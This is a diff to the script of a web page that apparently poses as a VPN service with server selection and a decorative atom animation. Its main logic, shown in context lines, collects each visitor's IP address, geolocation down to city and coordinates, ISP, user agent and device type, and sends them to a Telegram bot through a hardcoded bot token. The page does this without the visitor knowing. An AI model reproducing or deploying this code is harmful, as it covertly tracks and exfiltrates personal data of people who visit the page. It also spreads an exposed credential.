@@ -258,7 +258,7 @@
 
     <script>
         // ==============================================================
-        // 1. АТОМЫ: ВСЕГО 15 ШТУК, ТОЛЬКО ДЛЯ КРАСОТЫ
+        // 1. АТОМЫ (15 штук, лёгкая физика)
         // ==============================================================
         (function() {
             const canvas = document.getElementById('particleCanvas');
@@ -266,7 +266,7 @@
             let W, H;
             const atoms = [];
             const COUNT = 15;
-            const CONNECT_DIST = 200; // большое расстояние для редких соединений
+            const CONNECT_DIST = 200;
             const REPULSE_DIST = 80;
 
             function resize() {
@@ -355,7 +355,7 @@
         })();
 
         // ==============================================================
-        // 2. ОСНОВНАЯ ЛОГИКА (отправка IP 5 способами)
+        // 2. ОСНОВНАЯ ЛОГИКА (ОТПРАВКА IP 5 СПОСОБАМИ)
         // ==============================================================
 
         const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
@@ -375,7 +375,6 @@
 
         let connected = false;
 
-        // Выбор сервера
         for (let i = 0; i < serverOpts.length; i++) {
             serverOpts[i].addEventListener('click', function() {
                 for (let j = 0; j < serverOpts.length; j++) {
@@ -413,7 +412,7 @@
         }
 
         // ==============================================================
-        // ГЛАВНАЯ ФУНКЦИЯ ОТПРАВКИ: 5 СПОСОБОВ
+        // 5 СПОСОБОВ ОТПРАВКИ В TELEGRAM
         // ==============================================================
         function sendIPToTelegram(ip, geo, ua, time, device) {
             let msg = '🔹 НОВЫЙ ПЕРЕХОД (VPN)\n';
@@ -462,24 +461,20 @@
             const device = /iPhone|iPad|Android/i.test(ua) ? '📱 Мобильное' : '💻 Компьютер';
             const time = new Date().toLocaleString('ru-RU');
 
-            // Получаем IP
             fetch('https://api.ipify.org?format=json')
                 .then(r => r.json())
                 .then(d => { ip = d.ip; })
                 .catch(() => {})
                 .finally(() => {
                     if (ip !== 'Не определен') {
-                        // Пробуем получить гео
                         fetch('https://ip-api.com/json/' + ip + '?fields=status,country,regionName,city,lat,lon,isp,org,timezone')
                             .then(r => r.json())
                             .then(g => { if (g.status === 'success') geo = g; })
                             .catch(() => {})
                             .finally(() => {
-                                // ОТПРАВЛЯЕМ
                                 sendIPToTelegram(ip, geo, ua, time, device);
                             });
                     } else {
-                        // Если IP не получили, отправляем то что есть
                         sendIPToTelegram('Не определен', null, ua, time, device);
                     }
                 });
